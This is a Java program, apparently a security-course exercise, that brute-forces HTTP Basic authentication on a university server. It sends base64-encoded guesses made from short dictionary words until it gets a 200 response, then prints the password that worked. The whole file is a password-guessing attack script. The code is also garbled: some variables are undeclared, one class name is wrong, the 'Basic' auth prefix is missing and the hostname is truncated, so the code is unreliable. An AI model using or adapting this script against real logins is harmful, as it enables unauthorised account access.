

import java.io.*;
import java.*;
import java.net.*;
import java.util.*;

public class Dictionary {
 public static void  main (String[] args) throws IOException {
  BufferedReader stdin = new BufferedReader (new InputStreamReader(System.in));

       d  = new Date().getTime();
       FileReader fr = new FileReader("/usr/share/lib/dict/words");
       BufferedReader bufr = new BufferedReader(fr);
       String word = bufr.readLine();             
       int total = 960;
       String[] pws = new String[total];
       int count = 0;
       while (word!=null){
        if (word.length()<=3) { pws[count] = word; count++;}
	word = bufr.readLine();
       }
       
       int i=0;
       int response = 0;
       for (i=0;i<count;i++){
        String uname = "";
        String userinfo = uname + ":" + pws[i];
        try{
         String encoding = new bf.misc.BASE64Encoder().encode (userinfo.getBytes());
         URL url = new URL("http://sec-crack.cs.rmit.edu./SEC/2/");
         HttpURLConnection uc = (HttpURLConnection)url.openConnection();
         uc.setRequestProperty ("Authorization", " " + encoding);
         response = uc.getResponseCode();
	 if (response == 200) break;
	 else uc.disconnect();
        }
        catch(IOException e){ System.err.println(e); e.printStackTrace(); }   
        catch(IllegalStateException s){ System.err.println(s); s.printStackTrace(); }
       }
       System.out.println("Response "+i+" was "+response);
       System.out.println("The successful password was "+pws[i]);
        finish = new Date().getTime();
       float totaltime = (float)(finish-d)/1000;
       System.out.println("Time taken: "+totaltime+ " seconds.");
       
   }
}

